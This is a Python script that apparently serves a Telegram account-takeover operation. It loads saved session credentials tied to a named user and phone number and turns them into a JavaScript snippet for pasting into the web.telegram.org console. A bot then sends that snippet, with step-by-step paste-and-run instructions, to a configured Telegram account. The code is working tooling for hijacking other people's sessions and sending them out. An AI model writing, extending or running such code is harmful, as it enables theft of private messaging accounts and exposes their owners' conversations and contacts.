#!/usr/bin/env python3
"""
Generate Working Format Script

This script generates a JavaScript script in the exact format that works
for web.telegram.org console execution and sends it to specified Telegram users.
"""

import os
import json
import asyncio
from datetime import datetime
import os
from utils.credentials_manager import credentials_manager
from utils.tg.bot import TelegramBot

# Get target user ID from environment variable
TARGET_USER_ID = os.getenv('SCRIPT_TARGET_USER_ID')
TARGET_USER_IDS = [int(TARGET_USER_ID)] if TARGET_USER_ID else []

# Configuration
ENABLE_TELEGRAM_SENDING = True
CUSTOM_MESSAGE_PREFIX = "🔧 **Generated Working Script**"
INCLUDE_INSTRUCTIONS = True
INCLUDE_TIPS = True

async def send_script_to_users(script_content, script_filename):
    """Send the generated script to target Telegram users"""
    if not ENABLE_TELEGRAM_SENDING:
        print("⚠️  Telegram sending is disabled in configuration.")
        return
        
    if not TARGET_USER_IDS:
        print("⚠️  No target user ID configured. Skipping Telegram sending.")
        print("💡 Add SCRIPT_TARGET_USER_ID to your .env file to enable automatic sending.")
        return
    
    try:
        # Create bot instance
        bot = TelegramBot()
        
        # Prepare the message
        message_parts = [CUSTOM_MESSAGE_PREFIX]
        message_parts.append(f"")
        message_parts.append(f"📁 **File:** `{script_filename}`")
        message_parts.append(f"⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        message_parts.append(f"")
        
        if INCLUDE_INSTRUCTIONS:
            message_parts.extend([
                "📝 **Instructions:**",
                "1. Open https://web.telegram.org/a/ in your browser",
                "2. Press F12 to open Developer Tools", 
                "3. Go to Console tab",
                "4. Copy and paste the script below",
                "5. Press Enter to execute",
                ""
            ])
        
        if INCLUDE_TIPS:
            message_parts.extend([
                "💡 **Tips:**",
                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
                "- Try refreshing the page first",
                "- Try using a different browser or incognito mode", 
                "- Check if your network allows WebSocket connections",
                ""
            ])
        
        message_parts.extend([
            "🔗 **Script Content:**",
            "```",
            script_content,
            "```"
        ])
        
        message_text = "\n".join(message_parts)
        
        # Send to each target user
        success_count = 0
        for user_id in TARGET_USER_IDS:
            try:
                await bot.app.bot.send_message(
                    chat_id=user_id,
                    text=message_text,
                    parse_mode='Markdown'
                )
                print(f"✅ Script sent to user {user_id}")
                success_count += 1
            except Exception as e:
                print(f"❌ Failed to send to user {user_id}: {e}")
        
        print(f"📤 Sent script to {success_count}/{len(TARGET_USER_IDS)} users")
        
    except Exception as e:
        print(f"❌ Error sending script via Telegram: {e}")

def generate_working_script():
    """Generate working format script from latest credentials and send to users"""
    
    # Get the most recent JSON credentials file
    all_files = credentials_manager.list_credentials_files()
    json_files = [f for f in all_files if f['filename'].endswith('.json')]
    
    if not json_files:
        print("❌ No JSON credential files found")
        return
    
    latest_file = json_files[0]
    print(f"📁 Using latest credential file: {latest_file['filename']}")
    
    # Load the credentials
    credentials = credentials_manager.load_credentials(latest_file['filename'])
    if not credentials or 'session_data' not in credentials:
        print("❌ No valid session data found in credentials")
        return
    
    session_data = credentials['session_data']
    user_info = credentials.get('user_info', {})
    
    print(f"✅ Valid credential data found")
    print(f"👤 User: {user_info.get('first_name', 'Unknown')} {user_info.get('last_name', '')} (+{user_info.get('phone', 'Unknown')})")
    print(f"🔑 Auth Type: REAL")
    print(f"📦 Session Data Keys: {list(session_data.keys())}")
    
    # Generate the working format script
    script_content = credentials_manager.generate_working_format_script(session_data)
    
    # Save the script
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    script_filename = f"working_script_{timestamp}.js"
    script_filepath = os.path.join("credentials", script_filename)
    
    with open(script_filepath, 'w', encoding='utf-8') as f:
        f.write(script_content)
    
    print(f"✅ Working script generated: {script_filename}")
    
    # Send the script to Telegram users
    print("📤 Sending script to Telegram users...")
    asyncio.run(send_script_to_users(script_content, script_filename))
    
    print()
    print("📝 Instructions:")
    print("   1. Open https://web.telegram.org/a/ in your browser")
    print("   2. Press F12 to open Developer Tools")
    print("   3. Go to Console tab")
    print("   4. Copy and paste the script below")
    print("   5. Press Enter to execute")
    print()
    print("🔗 Script to copy:")
    print("=" * 80)
    print(script_content)
    print("=" * 80)
    print()
    print("💡 Tips:")
    print("   - Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)")
    print("   - Try refreshing the page first")
    print("   - Try using a different browser or incognito mode")
    print("   - Check if your network allows WebSocket connections")

if __name__ == "__main__":
    generate_working_script() 